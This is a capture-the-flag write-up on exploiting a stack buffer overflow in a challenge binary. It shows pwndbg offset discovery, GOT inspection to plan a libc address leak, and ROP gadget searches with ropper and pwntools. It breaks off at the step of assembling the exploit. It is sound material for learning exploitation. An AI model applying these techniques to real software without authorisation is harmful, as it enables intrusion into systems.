# C is super easy and secure 2

## Find Offset to cause overflow

First of all, you can check for the offset pattern that crashes the program (because of an overlow).

I like to use `pwndbg` for this:

```bash
$ pwndbg private.elf 
# Launches Pwndbg (GDB with powerful enhancements) and loads the binary `private.elf`.

pwndbg: loaded 179 pwndbg commands and 47 shell commands...
# Displays Pwndbg's initialization info; confirms availability of useful commands and functions.

Reading symbols from private.elf...
# GDB attempts to read debugging symbols. These would provide useful info like variable names and line numbers.

pwndbg> cyclic 64
# Generates a 64-byte cyclic pattern (unique sequence) for use in detecting buffer overflow offsets.

aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaa
# The actual generated pattern that will be input into the program.

pwndbg> r
# Runs the binary under GDB.

Please enter a username: HackTWK
Please enter a password: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaa
# User provides input (name + cyclic pattern) to trigger potential buffer overflow.

Program received signal SIGSEGV, Segmentation fault.
# The program crashes due to a segmentation fault — often indicates control over instruction pointer (EIP/RIP).

0x000000000040066d in main ()
# Crash occurred inside `main` at offset 0x40066d.

RBP  0x6161616161616167 ('gaaaaaaa')
# The base pointer (RBP) has been overwritten with part of the cyclic pattern — suggests stack buffer overflow.

RIP  0x40066d (main+434) ◂— ret 
# The instruction pointer (RIP) has not yet been overwritten; the crash happened on a return instruction.

───────────────────────────────────────────────────────────────────────────────────────────
rsp 0x7fffffffd3b8 ◂— 'haaaaaaa'
# Stack pointer (RSP) is pointing to part of the cyclic input — confirms overflow reached the stack.

pwndbg> cyclic -l 0x6161616161616168
# This command checks where in the cyclic pattern the value 0x6161616161616168 ('haaaaaaa') appears.

Found at offset 56
# Confirms that the crash occurred 56 bytes into the cyclic pattern — key to determining correct buffer size for exploit.
```

Now we know that the buffer is 56 bytes large.

## Find GOT Adress table to find libc version

In `pwndbg` you can just type `got` and it will print something like:

```bash
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /drives/f/git/HackTWK/Challenges/reversing/c-is-easy-and-secure-2/private.elf:
GOT protection: Partial RELRO | Found 6 GOT entries passing the filter
[0x403000] puts@GLIBC_2.2.5 -> 0x7ffff7dfc600 (puts) ◂— endbr64 
[0x403008] printf@GLIBC_2.2.5 -> 0x7ffff7dd4a80 (printf) ◂— endbr64 
[0x403010] strcspn@GLIBC_2.2.5 -> 0x7ffff7f04c40 (__strcspn_sse42) ◂— endbr64 
[0x403018] fgets@GLIBC_2.2.5 -> 0x7ffff7dfa2e0 (fgets) ◂— endbr64 
[0x403020] gets@GLIBC_2.2.5 -> 0x7ffff7dfb860 (gets) ◂— endbr64 
[0x403028] setvbuf@GLIBC_2.2.5 -> 0x7ffff7dfcea0 (setvbuf) ◂— endbr64 
```

The `0x7ffff7dfc600` addresses are only valid at the current runtime and need to be extracted using a ROP Chain.

## Crafting the address leaking



I use `ropper` to search for the assembly instructions of the `ret` and `pop rdi; ret` instance with `ropper --file ./private.elf --search "ret"`.

This will give me somethign like `0x0000000000400356: ret;`

You also could use `ROPgadget --binary private.elf | grep ret`, pwngdb or pwntools right away to find this.

We also need the "normal" address of the `pop rdi; ret` with e.g. `ropper --file ./private.elf --search "pop rdi"`

`0x00000000004004b6 : pop rdi ; ret`

We also need the `puts` address from the GOT Table. You can also retrive those values from pwntools with this code:

```python
got_puts_address = p64(binary.got.puts)
got_fgets_address = p64(binary.got.fgets)
```

### Putting everything together

